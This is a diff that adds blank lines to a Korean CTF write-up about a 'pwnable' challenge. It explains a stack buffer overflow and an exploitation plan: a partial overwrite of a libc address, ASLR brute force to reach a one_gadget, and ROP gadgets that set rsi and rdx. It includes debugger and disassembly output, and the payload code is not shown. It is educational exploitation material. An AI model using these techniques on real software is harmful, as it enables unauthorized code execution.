@@ -16,9 +16,11 @@ tags = ["ctf", "pwnable", "rop", "partial overwrite", "one gadget", "brute force
     NX:       NX enabled
     PIE:      No PIE (0x400000)
 ```
+
 가젯 이리 저리 조합하다가 매몰되어버린 문제.
 
 종료 20분 전에 알아버렸다...
+
 
 ## 0x01. Vulnerability
 ``` c
@@ -32,28 +34,35 @@ __int64 __fastcall main(int a1, char **a2, char **a3)
   return 1LL;
 }
 ```
+
 16바이트 `dest`에 0xbc만큼 입력을 받는 단순한 BOF 취약점이 발생한다.
+
 
 ## 0x02. Exploit
 출력 함수는 커녕 ROP를 하기 위한 가젯이 하나도 없다.
 
 그러다가 메모리를 보고 힌트를 얻었다.
+
 ``` bash
 gef➤  x/4gx $rsp + 0xb0
 0x7fffffffed00: 0x0000000000000000      0x0000000000000000
 0x7fffffffed10: 0x0000000000000000      0x00007ffff7000000
 ```
+
 `read()`의 마지막 부분인 `dest + 0xb8` 근처를 보면 매우 수상하게 libc 주소의 일부가 있다.
 
 하위 3바이트가 `0x00`으로 되어있는데, 딱 이 부분까지 쓸 수 있다. 
+
 ``` bash
 gef➤  x/4gx $rsp + 0xb0
 0x7fffffffed00: 0x4141414141414141      0x4141414141414141
 0x7fffffffed10: 0x4141414141414141      0x00007ffff7434241
 ```
+
 따라서 libc leak 없이 이 부분을 이용해서 예상되는 one shot 가젯 주소를 만들어두고 ASLR에 의해 확률적으로 해당 주소에 진짜 one shot 가젯이 로드되길 기대하는 방법이 있다.
 
 `main()`에서 return을 할 때의 레지스터 값들은 다음과 같다.
+
 ``` bash
 $rax   : 0x1
 $rbx   : 0x0
@@ -73,7 +82,9 @@ $r13   : 0x000000000040122a  →   endbr64
 $r14   : 0x0000000000403dc0  →  0x0000000000401160  →   endbr64
 $r15   : 0x00007ffff7ffd040  →  0x00007ffff7ffe2e0  →  0x0000000000000000
 ```
+
 이 상태에서 one shot 가젯 조건을 맞춰줘야하는데 가젯만 몇 시간을 봤더니 바로 방법이 떠올랐다.
+
 ``` bash
 ➜  one_gadget libc.so.6
 ...
@@ -84,7 +95,9 @@ constraints:
   [rdx] == NULL || rdx == NULL || rdx is a valid envp
 ...
 ```
+
 One shot 가젯 중 위와 같이 `rsi`, `rdx`에 조건이 걸려있는 가젯이 있었고 바이너리에 있는 가젯중 다음과 같은 것들이 있다.
+
 ``` bash
 ➜  objdump -M intel -d gf
 ...
@@ -108,6 +121,7 @@ One shot 가젯 중 위와 같이 `rsi`, `rdx`에 조건이 걸려있는 가젯�
   4011a0:       56                      push   rsi
   4011a1:       c3                      ret
 ```
+
 우선 `rdx`는 `pop_rsi_pop_rdx_push_rsi_ret` 가젯을 통해 컨트롤이 가능하고 어떤 의도인지는 모르겠으나 `shift_rsi_ret` 가젯을 통해 `rsi`를 0.5바이트씩 right shift 할 수 있다.
 
 `rsi`에는 `0x404060`가 저장되어있으므로 `shift_rsi_ret` 가젯을 6번 호출하면 `rsi`를 `0`으로 만들 수 있다.
@@ -119,6 +133,7 @@ One shot 가젯 중 위와 같이 `rsi`, `rdx`에 조건이 걸려있는 가젯�
 그런데 예선이 끝나고 다른 분의 exploit을 보니 100% exploit에 성공할 수 있는 방법이 있었다.
 
 몰랐던 내용이기도 하고 일반적으로 사용할 수 있을 것 같아서 따로 포스팅하겠다.
+
 
 ## 0x03. Payload
 ``` python
